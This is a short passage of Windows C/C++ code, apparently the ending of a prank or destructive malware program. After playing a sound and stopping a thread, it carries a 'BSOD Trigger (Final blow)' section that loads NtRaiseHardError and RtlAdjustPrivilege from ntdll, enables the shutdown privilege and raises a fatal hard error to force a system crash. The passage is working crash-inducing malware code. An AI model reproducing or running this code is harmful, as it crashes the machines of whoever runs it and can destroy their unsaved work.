    sound9(); Sleep(30000);
    TerminateThread(t10, 0); CloseHandle(t10);
    InvalidateRect(0, 0, 0);
    
    // BSOD Trigger (Final blow)
    BOOLEAN bl;
    DWORD response;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);
    
    Sleep(-1);
}